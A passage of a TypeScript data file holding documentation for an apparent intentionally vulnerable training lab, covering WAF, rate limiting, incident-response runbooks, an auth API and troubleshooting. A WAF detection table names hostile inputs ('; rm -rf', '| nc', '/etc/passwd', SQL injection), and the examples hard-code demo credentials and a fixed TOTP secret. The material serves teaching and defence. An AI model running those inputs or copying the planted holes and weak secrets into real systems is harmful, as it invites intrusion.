            type: 'code',
            language: 'python',
            content: `# JWT token structure
{
  "sub": "admin",  # Subject (username)
  "exp": 1699999999,  # Expiration (5 minutes from issue)
  "iat": 1699999699,  # Issued at
  "type": "access"  # Token type
}

# Signed with secret key: HS256(header + payload, SECRET_KEY)`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Rate Limiting',
          },
          {
            type: 'paragraph',
            content: 'Two-tier rate limiting implementation:',
          },
          {
            type: 'list',
            content: [
              'Gateway Level: 60 requests per minute per IP (token bucket algorithm)',
              'Auth Service: 10 login attempts before 15-minute IP ban',
              'Burst Allowance: Up to 10 requests in a burst (gateway)',
              'Storage: In-memory (gateway), Redis (auth service)',
            ],
          },
          {
            type: 'code',
            language: 'python',
            content: `# Token bucket rate limiting
class TokenBucket:
    def __init__(self, rate: int, capacity: int):
        self.rate = rate  # 60 req/min
        self.capacity = capacity  # 10 burst
        self.tokens = capacity
        self.last_update = time.time()

    def allow_request(self) -> bool:
        # Refill tokens based on time elapsed
        now = time.time()
        elapsed = now - self.last_update
        self.tokens = min(
            self.capacity,
            self.tokens + (elapsed * self.rate / 60)
        )
        self.last_update = now

        # Consume token if available
        if self.tokens >= 1:
            self.tokens -= 1
            return True
        return False`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Web Application Firewall (WAF)',
          },
          {
            type: 'paragraph',
            content: 'Pattern-based request validation at gateway:',
          },
          {
            type: 'table',
            content: {
              headers: ['Attack Type', 'Pattern', 'Action'],
              rows: [
                ['SQL Injection', "' OR 1=1, UNION SELECT, DROP TABLE", 'Block (400)'],
                ['XSS', '<script>, javascript:, onerror=', 'Block (400)'],
                ['Path Traversal', '../, ..\\\\, /etc/passwd', 'Block (400)'],
                ['Command Injection', '; rm -rf, | nc, && cat', 'Block (400)'],
              ],
            },
          },
          {
            type: 'code',
            language: 'python',
            content: `# WAF pattern matching
SQL_INJECTION_PATTERNS = [
    r"(\\'|\\\")(\\s)*(or|and)(\\s)*(\\'|\\\")?(\\s)*=",
    r"union(\\s)+select",
    r"drop(\\s)+table",
]

def check_sql_injection(text: str) -> bool:
    for pattern in SQL_INJECTION_PATTERNS:
        if re.search(pattern, text, re.IGNORECASE):
            return True  # Attack detected
    return False`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Security Headers',
          },
          {
            type: 'paragraph',
            content: 'HTTP security headers applied by gateway:',
          },
          {
            type: 'code',
            language: 'text',
            content: `X-Frame-Options: DENY
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'
Referrer-Policy: strict-origin-when-cross-origin`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'IP Banning',
          },
          {
            type: 'paragraph',
            content: 'Automated IP blocking based on attack patterns:',
          },
          {
            type: 'table',
            content: {
              headers: ['Trigger', 'Ban Duration', 'Storage'],
              rows: [
                ['10 failed logins', '15 minutes', 'Redis (auth service)'],
                ['Brute force alert', '1 hour', 'Redis (incident bot)'],
                ['MFA enumeration', '2 hours', 'Redis (incident bot)'],
                ['IDOR exploitation', '12 hours', 'Redis (incident bot)'],
                ['Gateway bypass', '24 hours', 'Redis (incident bot)'],
              ],
            },
          },
          {
            type: 'code',
            language: 'python',
            content: `# IP ban storage in Redis
await redis.setex(
    f"banned_ip:{ip_address}",
    duration,  # TTL in seconds
    json.dumps({
        "reason": "brute_force",
        "banned_at": datetime.utcnow().isoformat(),
        "expires_at": (datetime.utcnow() + timedelta(seconds=duration)).isoformat()
    })
)

# Check if IP is banned
banned = await redis.get(f"banned_ip:{request.client.host}")
if banned:
    raise HTTPException(status_code=403, detail="IP banned")`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Monitoring & Alerting',
          },
          {
            type: 'paragraph',
            content: 'Prometheus metrics and Alertmanager rules:',
          },
          {
            type: 'list',
            content: [
              'Login Attempts: Track success/failure rates (login_attempts_total)',
              'MFA Failures: Monitor brute force attempts (mfa_attempts_total)',
              'IDOR Detection: Count profile enumeration (user_service_idor_attempts_total)',
              'Rate Limit Blocks: Track violations (gateway_rate_limit_blocks_total)',
              'WAF Blocks: Monitor attack attempts (gateway_waf_blocks_total)',
            ],
          },
          {
            type: 'code',
            language: 'yaml',
            content: `# Prometheus alert rule example
- alert: LoginFailureSpike
  expr: |
    rate(login_attempts_total{status="failure"}[5m]) > 0.5
  for: 2m
  labels:
    severity: warning
    category: brute-force
  annotations:
    summary: "High login failure rate detected"
    description: "{{ $value }} failures per second"`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Defense in Depth Strategy',
          },
          {
            type: 'paragraph',
            content: 'Multiple layers ensure that compromising one control doesn\'t break entire security:',
          },
          {
            type: 'code',
            language: 'text',
            content: `Layer 1: Network
  - Docker networking
  - Firewall rules (in production)

Layer 2: Gateway
  - Rate limiting
  - WAF
  - Security headers

Layer 3: Authentication
  - JWT validation
  - MFA
  - Token revocation

Layer 4: Authorization
  - Role-based access control (RBAC)
  - Resource ownership checks

Layer 5: Monitoring
  - Real-time metrics
  - Automated alerting
  - Incident response

Layer 6: Incident Response
  - Automated IP banning
  - Runbook execution
  - Post-incident analysis`,
          },
          {
            type: 'info',
            content: 'Even with these controls, the intentional vulnerabilities (IDOR, auth bypass, direct access) demonstrate that security must be implemented at EVERY layer, not just perimeter defenses.',
          },
        ],
      },
      {
        slug: 'incident-response',
        title: 'Incident Response System',
        description: 'Automated detection and response to security incidents',
        category: 'defense',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Incident Response System',
          },
          {
            type: 'paragraph',
            content: 'The DevSecOps Hacking Lab implements an automated incident response system that detects attacks in real-time and executes predefined runbooks to contain and mitigate threats.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Architecture',
          },
          {
            type: 'code',
            language: 'text',
            content: `Prometheus → Alert Rules → Alertmanager → Incident Bot
                                            ↓
                                       Runbook Engine
                                            ↓
                         ┌──────────────────┼──────────────────┐
                         ↓                  ↓                  ↓
                   Notify Slack      Ban IP in Redis    Generate Report
                   Send Email        Update Firewall    Create Ticket`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Alert Flow',
          },
          {
            type: 'list',
            content: [
              'Services export metrics to Prometheus (/metrics endpoints)',
              'Prometheus evaluates alert rules every 15 seconds',
              'When threshold exceeded, alert fires to Alertmanager',
              'Alertmanager routes alert to Incident Bot via webhook',
              'Incident Bot matches alert to runbook based on labels',
              'Runbook actions execute sequentially',
              'Results logged and report generated',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Runbook Structure',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "name": "Brute Force Response",
  "description": "Automated response to login brute force attacks",
  "trigger": {
    "alertname": "LoginFailureSpike",
    "severity": "warning",
    "category": "brute-force"
  },
  "priority": 20,
  "actions": [
    {
      "type": "notify",
      "params": {
        "message": "Brute force attack detected from {source_ip}",
        "channels": ["security", "ops"]
      }
    },
    {
      "type": "ban_ip",
      "params": {
        "duration": 3600,
        "reason": "brute_force_attack"
      }
    },
    {
      "type": "report",
      "params": {
        "format": "json",
        "include_metrics": true
      }
    }
  ]
}`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Available Actions',
          },
          {
            type: 'table',
            content: {
              headers: ['Action Type', 'Description', 'Parameters'],
              rows: [
                ['notify', 'Send alert notification', 'message, channels, severity'],
                ['ban_ip', 'Block IP address in Redis', 'duration, reason'],
                ['report', 'Generate incident report', 'format (json/md), include_metrics'],
                ['remediate', 'Execute remediation script', 'script, args'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Prebuilt Runbooks',
          },
          {
            type: 'paragraph',
            content: 'The system includes 8 predefined runbooks:',
          },
          {
            type: 'list',
            content: [
              'brute-force-response.json - Login enumeration attacks',
              'mfa-bypass-response.json - TOTP brute force attempts',
              'idor-response.json - Unauthorized profile access',
              'gateway-bypass-response.json - Direct service access',
              'rate-limit-response.json - Rate limit violations',
              'sql-injection-response.json - WAF SQL injection blocks',
              'xss-response.json - Cross-site scripting attempts',
              'credential-leak-response.json - Credential stuffing attacks',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Alert Severity Levels',
          },
          {
            type: 'table',
            content: {
              headers: ['Severity', 'Response Time', 'Actions', 'Examples'],
              rows: [
                ['critical', 'Immediate', 'Ban IP, Page on-call, Lock accounts', 'Active breach, data exfiltration'],
                ['warning', '< 5 minutes', 'Ban IP, Notify team, Generate report', 'Brute force, IDOR, MFA bypass'],
                ['info', '< 1 hour', 'Log, Report, Monitor', 'Rate limit hits, WAF blocks'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'Incident Bot API',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Get incident bot stats
curl http://localhost:5002/stats | jq
{
  "runbooks_loaded": 8,
  "incidents_handled": 42,
  "uptime_seconds": 3600
}

# Get incident history
curl http://localhost:5002/incidents | jq
[
  {
    "id": "inc-20251114-001",
    "alert_name": "LoginFailureSpike",
    "severity": "warning",
    "timestamp": "2025-11-14T10:30:00Z",
    "source_ip": "192.168.1.100",
    "actions_executed": ["notify", "ban_ip", "report"],
    "status": "resolved"
  }
]

# Manually trigger incident simulation
cd monitoring/incident-bot
python simulate_incident.py --attack brute-force`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Report Generation',
          },
          {
            type: 'paragraph',
            content: 'Incident reports are auto-generated in multiple formats:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Reports stored in container
docker exec incident-bot ls /app/reports/
incident-20251114-103000-brute-force.json
incident-20251114-103000-brute-force.md

# View report
docker exec incident-bot cat /app/reports/incident-20251114-103000-brute-force.json`,
          },
          {
            type: 'paragraph',
            content: 'Report contents include:',
          },
          {
            type: 'list',
            content: [
              'Incident metadata (ID, timestamp, severity, category)',
              'Alert details (name, labels, annotations)',
              'Source information (IP, user agent, geolocation)',
              'Actions taken (notifications sent, IPs banned, etc.)',
              'Prometheus metrics snapshot at time of incident',
              'Timeline of events',
              'Remediation recommendations',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Integration with Grafana',
          },
          {
            type: 'paragraph',
            content: 'The Incident Response dashboard in Grafana visualizes:',
          },
          {
            type: 'list',
            content: [
              'Incident timeline (past 24 hours)',
              'Incidents by category (pie chart)',
              'Response times (histogram)',
              'Banned IPs (table)',
              'Runbook execution stats',
              'Alert fire rate',
            ],
          },
          {
            type: 'heading',
            level: 2,
            content: 'Creating Custom Runbooks',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "name": "Custom Attack Response",
  "description": "Your custom runbook",
  "trigger": {
    "alertname": "YourAlertName",
    "severity": "warning",
    "category": "custom"
  },
  "priority": 10,
  "actions": [
    {
      "type": "notify",
      "params": {
        "message": "Custom attack detected: {{.Labels.instance}}",
        "channels": ["security"]
      }
    },
    {
      "type": "ban_ip",
      "params": {
        "duration": 7200,
        "reason": "custom_attack"
      }
    },
    {
      "type": "report",
      "params": {
        "format": "json"
      }
    }
  ]
}`,
          },
          {
            type: 'paragraph',
            content: 'Save to monitoring/incident-bot/runbooks/ and restart incident-bot service.',
          },
          {
            type: 'info',
            content: 'Runbooks are matched by priority (higher number = higher priority). If multiple runbooks match an alert, the highest priority runbook is executed.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Testing Incident Response',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Simulate brute force attack
cd monitoring/incident-bot
python simulate_incident.py --attack brute-force

# Trigger all attack scenarios
python simulate_incident.py --attack all

# Advanced credential leak demo
python demo_credential_leak.py

# Watch Grafana Incident Response dashboard
open http://localhost:3000/d/incident-response

# Monitor incident bot logs
docker-compose logs -f incident-bot`,
          },
          {
            type: 'warning',
            content: 'IP banning is stored in Redis but not actively enforced by the gateway in the current demo. Integration with gateway middleware or iptables is required for active blocking.',
          },
        ],
      },
    ],
  },
  {
    id: 'api-reference',
    title: 'API Reference',
    description: 'Complete API documentation with examples',
    icon: 'Code',
    guides: [
      {
        slug: 'authentication-api',
        title: 'Authentication API',
        description: 'JWT authentication, MFA, and token management endpoints',
        category: 'api-reference',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Authentication API',
          },
          {
            type: 'paragraph',
            content: 'The Auth Service (login-api) provides JWT-based authentication with MFA support. All authentication flows use a two-step process: password verification followed by MFA verification.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Base URL',
          },
          {
            type: 'code',
            language: 'text',
            content: `Production: http://localhost:8080/auth  (via gateway)
Development: http://localhost:8000/auth  (direct access)`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'POST /auth/login',
          },
          {
            type: 'paragraph',
            content: 'Step 1: Password authentication. Returns a challenge ID for MFA verification.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `curl -X POST http://localhost:8000/auth/login \\
  -H "Content-Type: application/json" \\
  -d '{
    "username": "admin",
    "password": "admin123"
  }'`,
          },
          {
            type: 'paragraph',
            content: 'Response (200 OK):',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "message": "Password verified. Complete MFA verification.",
  "challenge_id": "chall_8f7e6d5c4b3a2910",
  "mfa_required": true,
  "expires_in": 300
}`,
          },
          {
            type: 'paragraph',
            content: 'Error Responses:',
          },
          {
            type: 'table',
            content: {
              headers: ['Status', 'Reason', 'Response'],
              rows: [
                ['401', 'Invalid credentials', '{"detail": "Invalid username or password"}'],
                ['429', 'Rate limit exceeded', '{"detail": "Too many login attempts"}'],
                ['403', 'IP banned', '{"detail": "IP address banned"}'],
              ],
            },
          },
          {
            type: 'heading',
            level: 2,
            content: 'POST /auth/mfa/verify',
          },
          {
            type: 'paragraph',
            content: 'Step 2: MFA verification. Validates TOTP code and returns JWT tokens.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `curl -X POST http://localhost:8000/auth/mfa/verify \\
  -H "Content-Type: application/json" \\
  -d '{
    "challenge_id": "chall_8f7e6d5c4b3a2910",
    "code": "123456"
  }'`,
          },
          {
            type: 'paragraph',
            content: 'Response (200 OK):',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 300
}`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'POST /auth/token/refresh',
          },
          {
            type: 'paragraph',
            content: 'Obtain a new access token using a valid refresh token.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `curl -X POST http://localhost:8000/auth/token/refresh \\
  -H "Content-Type: application/json" \\
  -d '{
    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  }'`,
          },
          {
            type: 'paragraph',
            content: 'Response (200 OK):',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer",
  "expires_in": 300
}`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'POST /auth/logout',
          },
          {
            type: 'paragraph',
            content: 'Revoke access and refresh tokens.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `curl -X POST http://localhost:8000/auth/logout \\
  -H "Authorization: Bearer <access_token>" \\
  -H "Content-Type: application/json" \\
  -d '{
    "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  }'`,
          },
          {
            type: 'paragraph',
            content: 'Response (200 OK):',
          },
          {
            type: 'code',
            language: 'json',
            content: `{
  "message": "Successfully logged out"
}`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Using JWT Tokens',
          },
          {
            type: 'paragraph',
            content: 'Include the access token in the Authorization header for authenticated requests:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `curl http://localhost:8080/protected \\
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'JavaScript Example',
          },
          {
            type: 'code',
            language: 'typescript',
            content: `// Step 1: Password login
const loginResponse = await fetch('http://localhost:8000/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: 'admin',
    password: 'admin123'
  })
})
const { challenge_id } = await loginResponse.json()

// Step 2: MFA verification (get code from authenticator app)
const mfaCode = '123456'  // From TOTP app
const mfaResponse = await fetch('http://localhost:8000/auth/mfa/verify', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    challenge_id,
    code: mfaCode
  })
})
const { access_token, refresh_token } = await mfaResponse.json()

// Step 3: Use access token
const protectedResponse = await fetch('http://localhost:8080/protected', {
  headers: {
    'Authorization': \`Bearer \${access_token}\`
  }
})`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Python Example',
          },
          {
            type: 'code',
            language: 'python',
            content: `import requests
import pyotp

# Step 1: Password login
response = requests.post('http://localhost:8000/auth/login', json={
    'username': 'admin',
    'password': 'admin123'
})
challenge_id = response.json()['challenge_id']

# Step 2: Generate TOTP code
totp = pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30)
mfa_code = totp.now()

# Step 3: MFA verification
response = requests.post('http://localhost:8000/auth/mfa/verify', json={
    'challenge_id': challenge_id,
    'code': mfa_code
})
access_token = response.json()['access_token']

# Step 4: Use access token
headers = {'Authorization': f'Bearer {access_token}'}
response = requests.get('http://localhost:8080/protected', headers=headers)`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Token Lifecycle',
          },
          {
            type: 'table',
            content: {
              headers: ['Token Type', 'Expiry', 'Storage', 'Purpose'],
              rows: [
                ['Access Token', '5 minutes', 'Client memory', 'API authentication'],
                ['Refresh Token', '60 minutes', 'Redis + Client', 'Obtain new access tokens'],
                ['Challenge ID', '5 minutes', 'Redis', 'Link password to MFA step'],
              ],
            },
          },
          {
            type: 'info',
            content: 'Access tokens are short-lived (5 minutes) to limit exposure. Use refresh tokens to obtain new access tokens without re-entering credentials.',
          },
        ],
      },
    ],
  },
  {
    id: 'troubleshooting',
    title: 'Troubleshooting',
    description: 'Common issues and solutions',
    icon: 'AlertCircle',
    guides: [
      {
        slug: 'common-issues',
        title: 'Common Issues',
        description: 'Solutions to frequently encountered problems',
        category: 'troubleshooting',
        lastUpdated: '2025-11-14',
        content: [
          {
            type: 'heading',
            level: 1,
            content: 'Common Issues',
          },
          {
            type: 'paragraph',
            content: 'This guide covers common problems you may encounter and their solutions.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'Backend Connection Failed',
          },
          {
            type: 'paragraph',
            content: 'Frontend shows "Backend Disconnected" or attacks fail with connection errors.',
          },
          {
            type: 'info',
            content: 'Verify all Docker services are running',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check service status
docker-compose ps

# Expected output: All services should be "Up"
# If any service is "Exit 1" or missing, restart it:
docker-compose restart <service-name>

# If issues persist, rebuild:
docker-compose down
docker-compose up -d --build`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Port Conflicts',
          },
          {
            type: 'paragraph',
            content: 'Docker fails to start with "port is already allocated" error.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Find process using the port (example: port 8080)
# Windows:
netstat -ano | findstr :8080

# Linux/Mac:
lsof -i :8080

# Kill the process or change ports in docker-compose.yml:
ports:
  - "8081:8080"  # Map to different host port`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Authentication Fails',
          },
          {
            type: 'paragraph',
            content: 'Unable to login or MFA verification fails.',
          },
          {
            type: 'list',
            content: [
              'Verify credentials: admin / admin123',
              'Check MFA code is current (30-second window)',
              'View MFA code in Docker logs: docker-compose logs login-api | grep mfa_code',
              'Ensure system time is synchronized (TOTP requires accurate time)',
              'Check Redis is running: docker-compose ps redis',
            ],
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Generate MFA code manually
docker exec login-api python -c "import pyotp; print(pyotp.TOTP('DEVSECOPSTWENTYFOURHACKINGLAB', interval=30).now())"

# Check Redis connectivity
docker exec redis redis-cli ping
# Should return: PONG`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Attack Scripts Not Working',
          },
          {
            type: 'paragraph',
            content: 'Python attack scripts fail with import or connection errors.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Install dependencies
cd attacks/brute-force
pip install -r requirements.txt

# Verify backend is accessible
curl http://localhost:8000/health

# Check for port conflicts or firewall blocking
telnet localhost 8000`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Metrics Not Appearing',
          },
          {
            type: 'paragraph',
            content: 'Grafana shows no data or Prometheus has no targets.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check Prometheus targets
curl http://localhost:9090/api/v1/targets | jq

# Verify metrics endpoints
curl http://localhost:8080/metrics
curl http://localhost:8002/metrics

# Restart Prometheus
docker-compose restart prometheus

# Check Grafana datasource
# Navigate to: http://localhost:3000/datasources
# Ensure Prometheus datasource URL is: http://prometheus:9090`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Incident Bot Not Responding',
          },
          {
            type: 'paragraph',
            content: 'Alerts fire but incident bot doesn\'t execute runbooks.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check incident bot logs
docker-compose logs incident-bot

# Verify runbooks loaded
curl http://localhost:5002/stats | jq

# Check Alertmanager routing
curl http://localhost:9093/api/v2/status | jq

# Test webhook manually
curl -X POST http://localhost:5002/webhook \\
  -H "Content-Type: application/json" \\
  -d '{
    "alerts": [{
      "labels": {
        "alertname": "LoginFailureSpike",
        "severity": "warning",
        "category": "brute-force"
      }
    }]
  }'`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Frontend Build Fails',
          },
          {
            type: 'paragraph',
            content: 'npm run build or npm run dev fails with errors.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Clear node_modules and reinstall
cd frontend
rm -rf node_modules package-lock.json
npm install

# Clear Vite cache
rm -rf node_modules/.vite

# Check Node version (requires 18+)
node --version

# Try with legacy OpenSSL (if Node 18 on older systems)
export NODE_OPTIONS=--openssl-legacy-provider
npm run dev`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Docker Out of Memory',
          },
          {
            type: 'paragraph',
            content: 'Services crash or fail to start due to memory limits.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check Docker memory allocation
docker stats

# Increase Docker Desktop memory:
# Settings → Resources → Memory → Increase to 4GB+

# Reduce running services (start only what you need)
docker-compose up -d login-api api-gateway user-service redis prometheus grafana`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Database/Redis Connection Errors',
          },
          {
            type: 'paragraph',
            content: 'Services fail with Redis connection errors.',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Check Redis is running
docker-compose ps redis

# Test Redis connection
docker exec redis redis-cli ping

# Check Redis logs
docker-compose logs redis

# Restart Redis
docker-compose restart redis

# Verify Redis network connectivity from service
docker exec login-api ping redis`,
          },
          {
            type: 'heading',
            level: 2,
            content: 'Clean Restart',
          },
          {
            type: 'paragraph',
            content: 'When all else fails, perform a complete clean restart:',
          },
          {
            type: 'code',
            language: 'bash',
            content: `# Stop all services and remove volumes
docker-compose down -v

# Remove all images (optional, forces rebuild)
docker-compose down --rmi all

# Rebuild and start
docker-compose build --no-cache
docker-compose up -d

# Verify all services
docker-compose ps
curl http://localhost:8080/health`,
          },
          {
            type: 'warning',
            content: 'Using -v flag removes ALL volumes including Redis data. You will lose session data, banned IPs, and any persistent state.',
          },
          {
            type: 'heading',
            level: 2,
            content: 'FAQ',
          },
          {
            type: 'paragraph',
            content: 'Frequently asked questions:',
          },
          {
            type: 'table',
            content: {
              headers: ['Question', 'Answer'],
              rows: [
                ['Where do I find MFA codes?', 'Docker logs: docker-compose logs login-api | grep mfa_code'],
                ['How do I reset the demo environment?', 'docker-compose down -v && docker-compose up -d'],
                ['Why are attacks not working?', 'Check backend is running: curl http://localhost:8000/health'],
                ['How do I view service logs?', 'docker-compose logs -f <service-name>'],
                ['Can I change ports?', 'Yes, edit docker-compose.yml ports section'],
                ['How do I access Grafana?', 'http://localhost:3000 (admin/admin)'],
                ['Where are incident reports?', 'docker exec incident-bot ls /app/reports/'],
                ['How do I add new attacks?', 'See attacks/ directory, copy existing structure'],
              ],
            },
          },
        ],
      },
    ],
  },
]

/**
 * Get all guides flattened
 */
export function getAllGuides(): DocGuide[] {
  return DOC_SECTIONS.flatMap((section) => section.guides)
}

/**
 * Get guide by slug
 */
export function getGuideBySlug(slug: string): DocGuide | undefined {
  return getAllGuides().find((guide) => guide.slug === slug)
}

/**
 * Search guides
 */
export function searchGuides(query: string): DocGuide[] {
  const lowerQuery = query.toLowerCase()
  return getAllGuides().filter(
    (guide) =>
      guide.title.toLowerCase().includes(lowerQuery) ||
      guide.description.toLowerCase().includes(lowerQuery) ||
      JSON.stringify(guide.content).toLowerCase().includes(lowerQuery)
  )
}
